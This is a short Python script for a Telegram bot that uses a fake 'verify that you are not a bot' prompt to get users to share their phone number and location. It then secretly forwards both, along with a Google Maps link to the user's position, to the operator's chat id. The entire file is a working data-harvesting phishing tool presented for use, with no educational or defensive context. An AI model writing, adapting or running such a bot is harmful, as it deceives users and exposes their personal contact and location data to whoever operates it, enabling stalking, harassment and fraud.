import telebot
from telebot import types
Token=input('○ Tybe your Token : ')
bot = telebot.TeleBot(Token)
id = input('○ Tybe Your id : ')

@bot.message_handler(commands=['start'])
def register(message):
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True)
    reg_button = types.KeyboardButton(text="Share My Number", request_contact=True)
    location_button = types.KeyboardButton(text="Share My Location", request_location=True)
    keyboard.add(reg_button, location_button)
    response = bot.send_message(message.chat.id, "Please verify that you are not a bot", reply_markup=keyboard)
@bot.message_handler(content_types=['contact'])
def contact_handler(message):
    num = message.contact.phone_number
    bot.send_message(id, text=f"Done Get Phone Number : {num}")
    bot.send_message(message.chat.id, text="Thx :)")
@bot.message_handler(content_types=['location'])
def location_handler(message):
    loc = message.location
    lat = loc.latitude
    lon = loc.longitude
    bot.send_message(id, text=f'''
Done Get User Location :
Latitude={lat}
Longitude={lon}
● [ Google map ](https://www.google.com/maps/place/{lat},{lon})''',parse_mode='markdown')
    bot.send_message(message.chat.id, text="Thx for sharing your location :)")
print('- Start Bot .')
bot.infinity_polling()